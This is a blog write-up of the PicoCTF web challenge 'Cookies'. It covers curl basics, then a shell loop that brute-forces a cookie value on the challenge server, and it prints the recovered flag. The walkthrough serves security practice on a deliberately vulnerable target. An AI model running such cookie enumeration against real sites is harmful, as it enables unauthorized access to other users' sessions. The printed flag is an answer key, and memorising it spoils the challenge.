---
title: PicoCTF - Cookies
tags: [PicoCTF, CTF, Web]

category: "Security Practice｜PicoCTF｜Web"
date: 2023-02-20
---

# PicoCTF - Cookies
<!-- more -->
###### tags: `PicoCTF` `CTF` `Web`
Challenge: http://mercury.picoctf.net:64944/

## Background
[curl 的用法指南](https://www.ruanyifeng.com/blog/2019/09/curl-reference.html)
> -H參數添加 HTTP 請求的標頭。
`$ curl -H 'Accept-Language: en-US' https://google.com`

> -s參數將不輸出錯誤和進度信息。
`$ curl -s https://www.example.com`

> -L參數會讓 HTTP 請求跟隨服務器的重定向。curl 默認不跟隨重定向。
`$ curl -L -d 'tweet=hi' https://api.twitter.com/tweet`

> -I參數向服務器發出 HEAD 請求，然會將服務器返回的 HTTP 標頭打印出來。
`$ curl -I https://www.example.com`


## Exploit
1. Try to analyze
When I input something, it'll redirect to another page
![](https://i.imgur.com/Pq7XpNZ.png)
![](https://i.imgur.com/pKZJWfd.png)
I tried to change cookie to different number and also modify the different value of `name` parameter however, still got wrong information.

2. What about the redirect request
    ```bash!
    $ curl http://mercury.picoctf.net:64944/ -I
    HTTP/1.1 302 FOUND
    Content-Type: text/html; charset=utf-8
    Content-Length: 209
    Location: http://mercury.picoctf.net:64944/
    Set-Cookie: name=-1; Path=/
    ```
    You can see that there is a cookie in header

3. How about setting different value?
    ```bash!
    $ curl http://mercury.picoctf.net:64944/ -H "Cookie: name=0;" -L
    ...
              <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
                </div>



            <div class="jumbotron">
                <p class="lead"></p>
                <p style="text-align:center; font-size:30px;"><b>I love snickerdoodle cookies!</b></p>
            </div>
    ...
    ```
    It seems a hint to find value.

<font color="FF0000">通靈</font>
4. Brute force
```bash!
$ for i in {1..20};
for> do
for> contents=$(curl -s http://mercury.picoctf.net:27177/ -H "Cookie: name=$i; Path=/" -L)
for> if ! echo "$contents" | grep -q "Not very special"; then
for then> echo "Cookie #$i is special"
for then> echo $contents | grep "pico"
for then> break
for then> fi
for> done
Cookie #18 is special
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_064663be}</code></p>
```


## Reference
[[ Day10] Web 小複習 ](https://ithelp.ithome.com.tw/articles/10271065)